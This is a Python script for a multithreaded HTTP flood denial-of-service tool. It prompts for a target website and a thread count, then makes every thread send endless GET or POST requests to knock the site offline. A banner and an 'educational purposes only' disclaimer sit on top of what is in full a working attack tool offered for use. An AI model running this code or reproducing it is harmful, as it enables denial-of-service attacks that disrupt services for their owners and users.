import requests
import threading
import time 

class Dos(threading.Thread):
    USER_AGENT = "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1"
    amount = 0
    url = ""

    def __init__(self, seq, type):
        threading.Thread.__init__(self)
        self.seq = seq
        self.type = type

    def run(self):
        while True:
            if self.type == 1:
                self.postAttack(Dos.url)
            elif self.type == 2:
                self.sslPostAttack(Dos.url)
            elif self.type == 3:
                self.getAttack(Dos.url)
            elif self.type == 4:
                self.sslGetAttack(Dos.url)

    @staticmethod
    def main():
        url = ""
        attakingAmoun = 0
        dos = Dos(0, 0)
        print("")
        print("")
        print("")
        print("      WELCOME TO")
        print(" -------------------------------------------------------------------------------------------------------------------- ")        
        print("|  _____   ____   _____       _    _ _    ___     _______ _    _ _    _         _               __  __ ____   ____    |")
        print("| |  __ \ / __ \ / ____|     | |  | | |  | \ \   / / ____| |  | | |  | |  /\   | |        /\   |  \/  |  _ \ / __ \   |")        
        print("| | |  | | |  | | (___ ______| |__| | |  | |\ \_/ | |    | |__| | |  | | /  \  | |       /  \  | \  / | |_) | |  | |  |")
        print("| | |  | | |  | |\___ |______|  __  | |  | | \   /| |    |  __  | |  | |/ /\ \ | |      / /\ \ | |\/| |  _ <| |  | |  |")
        print("| | |__| | |__| |____) |     | |  | | |__| |  | | | |____| |  | | |__| / ____ \| |____ / ____ \| |  | | |_) | |__| |  |")
        print("| |_____/ \____/|_____/      |_|  |_|\____/   |_|  \_____|_|  |_|\____/_/    \_|______/_/    \_|_|  |_|____/ \____/   |")
        print(" -------------------------------------------------------------------------------------------------------------------- ")
        print("Author: Huy_chualambo")   
        print("------------------------------------------------------------------------------------------------------------")
        print("Don't attack GOV websites, for educational purposes only, I don't take any responsibility for your behavior")  
        print("------------------------------------------------------------------------------------------------------------")   
        url = input(">>> ENTER WEBSITE(e.g: https://github.com/):")
        print("\n")
        print(">>> CHECKING: " + url)
        SUrl = url.split(":")
        print(">>> Run >>> ")
        if SUrl[0] == "http" or SUrl[0] == "https":
            dos.checkConnection(url)
        else:
            dos.sslCheckConnection(url)
        print("successfully connected!!!")
        print("Now, enter Thread and Methods ")
        amount = input(">>> Thread(default/17000) : ")
        if amount == "" or amount is None:
            Dos.amount = 2000
        else:
            Dos.amount = int(amount)
        option = input(">>> Methods(default/80000) : ")
        ioption = 1
        if option.lower() == "get":
            if SUrl[0] == "http" or SUrl[0] == "https":
                ioption = 3
            else:
                ioption = 4
        else:
            if SUrl[0] == "http" or SUrl[0] == "https":
                ioption = 1
            else:
                ioption = 2
        time.sleep(2)
        print(">>> Sent to: ")
        threads = []
        for i in range(Dos.amount):
            t = Dos(i, ioption)
            t.start()
            threads.append(t)
        for t in threads:
            t.join()
        print("main threads dead")

    def checkConnection(self, url):
        print("Checking Connection")
        response = requests.get(url, headers={"User-Agent": self.USER_AGENT})
        if response.status_code == 200:
            print("Connected to website")
        Dos.url = url

    def sslCheckConnection(self, url):
        print("Checking Connection (ssl)")
        response = requests.get(url, headers={"User-Agent": self.USER_AGENT})
        if response.status_code == 200:
            print("Connected to website")
        Dos.url = url

    def postAttack(self, url):
        response = requests.post(url, headers={"User-Agent": self.USER_AGENT, "Accept-Language": "en-US,en;"}, data="out of memory")
        print("POST Attack: " + str(response.status_code) + "Thread: " + str(self.seq))

    def getAttack(self, url):
        response = requests.get(url, headers={"User-Agent": self.USER_AGENT})
        print("GET Attack: " + str(response.status_code) + "Thread: " + str(self.seq))

    def sslPostAttack(self, url):
        response = requests.post(url, headers={"User-Agent": self.USER_AGENT, "Accept-Language": "en-US,en;"}, data="out of memory")
        print("GET Attack :" + str(response.status_code) + "Thread: " + str(self.seq))

    def sslGetAttack(self, url):
        response = requests.get(url, headers={"User-Agent": self.USER_AGENT})
        print("GET Attack : " + str(response.status_code) + "Thread: " + str(self.seq))

if __name__ == "__main__":
    Dos.main()

